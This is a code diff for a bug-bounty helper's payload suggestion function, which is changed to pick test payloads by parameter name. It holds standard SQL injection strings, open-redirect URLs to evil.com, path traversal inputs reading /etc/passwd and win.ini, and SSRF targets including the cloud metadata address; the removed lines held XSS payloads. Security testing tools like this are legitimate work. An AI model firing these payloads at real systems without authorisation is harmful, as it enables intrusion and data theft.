@@ -2,42 +2,55 @@
  * BountyScope Payload Suggestion Engine
  */
 
-export function generatePayloads(parameters = []) {
+export function generatePayloads(parameter) {
 
-  const payloadTemplates = {
+  const payloads = [];
 
-    XSS: [
-      "<script>alert(1)</script>",
-      "\"><svg/onload=alert(1)>",
-      "<img src=x onerror=alert(1)>"
-    ],
+  const name = parameter.toLowerCase();
 
-    SQLi: [
-      "' OR 1=1 --",
-      "admin'--",
-      "' UNION SELECT NULL--"
-    ],
+  if (name.includes("id")) {
+    payloads.push({
+      type: "IDOR",
+      payloads: ["1", "2", "999"]
+    });
 
-    SSRF: [
-      "http://169.254.169.254/latest/meta-data/",
-      "http://localhost:80",
-      "http://127.0.0.1"
-    ],
-
-    OpenRedirect: [
-      "https://evil.com",
-      "//evil.com",
-      "https:google.com@evil.com"
-    ]
-
+    payloads.push({
+      type: "SQL Injection",
+      payloads: ["' OR 1=1 --", "' UNION SELECT NULL --"]
+    });
   }
 
-  return parameters.map(param => ({
+  if (name.includes("redirect") || name.includes("url")) {
+    payloads.push({
+      type: "Open Redirect",
+      payloads: [
+        "https://evil.com",
+        "//evil.com",
+        "https://google.com@evil.com"
+      ]
+    });
+  }
 
-    parameter: param,
+  if (name.includes("file") || name.includes("path")) {
+    payloads.push({
+      type: "Path Traversal",
+      payloads: [
+        "../../etc/passwd",
+        "../../../../windows/win.ini"
+      ]
+    });
+  }
 
-    payloads: payloadTemplates
+  if (name.includes("url")) {
+    payloads.push({
+      type: "SSRF",
+      payloads: [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost",
+        "http://127.0.0.1"
+      ]
+    });
+  }
 
-  }))
-
+  return payloads;
 }
